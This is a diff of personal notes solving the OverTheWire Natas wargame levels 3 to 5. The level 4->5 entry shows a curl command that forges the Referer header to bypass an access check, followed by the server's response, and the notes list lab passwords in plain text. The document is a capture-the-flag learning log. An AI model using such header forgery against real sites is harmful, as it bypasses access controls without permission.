@@ -35,7 +35,6 @@ Each level has access to the password of the next level. Your job is to somehow 
 <img width="563" alt="Screenshot 2025-05-28 at 6 47 40 PM" src="https://github.com/user-attachments/assets/03250a35-1686-4dfe-98f8-43a84483c88d" />
 <img width="619" alt="Screenshot 2025-05-28 at 6 47 54 PM" src="https://github.com/user-attachments/assets/197b3680-1cb0-40a1-9e53-f9d8951c2a23" />
 
-
 ## 3->4
 - http://natas3.natas.labs.overthewire.org/
 - `natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`
@@ -47,3 +46,49 @@ Each level has access to the password of the next level. Your job is to somehow 
 <img width="598" alt="Screenshot 2025-05-28 at 7 07 41 PM" src="https://github.com/user-attachments/assets/7b2d63c6-b2be-47e1-b1a9-7d2e8a84afd7" />
 <img width="557" alt="Screenshot 2025-05-28 at 7 08 03 PM" src="https://github.com/user-attachments/assets/1d516330-1914-4713-8537-b6d35c7d7f13" />
 <img width="615" alt="Screenshot 2025-05-28 at 7 08 15 PM" src="https://github.com/user-attachments/assets/28efd70b-e816-49c4-94d6-d01408f6d941" />
+
+## 4->5
+- http://natas4.natas.labs.overthewire.org/
+- `natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK`
+- Hmm, not sure what to do on this. Clue is to impersonate natas5? How to do this? How can I manipulate the request?
+- Maybe something to do with the `Refresh Page` button?
+- https://mayadevbe.me/posts/overthewire/natas/natas4/
+- Ah, so when `index.php` is accessed, we can use Dev Tools to copy the request as a `cURL` command, then in the command, we can change the request headers `Referer` from `natas4` to `natas5`.
+- But how do we know it is the request header `Referer` we need to update? https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer
+
+<img width="2226" alt="Screenshot 2025-05-29 at 6 41 44 PM" src="https://github.com/user-attachments/assets/d89b6dc9-2821-44cb-8073-2542916cf4a1" />
+<img width="2211" alt="Screenshot 2025-05-29 at 6 42 14 PM" src="https://github.com/user-attachments/assets/662e0bb9-ce5f-4989-a358-4d8c2f08a3a0" />
+<img width="2550" alt="Screenshot 2025-05-29 at 6 45 36 PM" src="https://github.com/user-attachments/assets/5f97f270-ec7a-4b3c-8742-b1773935bd93" />
+
+```bash
+curl 'http://natas4.natas.labs.overthewire.org/index.php' \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+  -H 'Accept-Language: en-US,en;q=0.9,es;q=0.8' \
+  -H 'Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR' \
+  -H 'Connection: keep-alive' \
+  -b '_ga=GA1.1.1643144631.1741815779; _ga_RD0K2239G0=GS2.1.s1748568709$o17$g1$t1748568710$j59$l0$h0' \
+  -H 'Referer: http://natas5.natas.labs.overthewire.org/' \
+  -H 'Upgrade-Insecure-Requests: 1' \
+  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36' \
+  --insecure
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
+<body>
+<h1>natas4</h1>
+<div id="content">
+
+Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+<br/>
+<div id="viewsource"><a href="index.php">Refresh page</a></div>
+</div>
+</body>
+</html>
+```
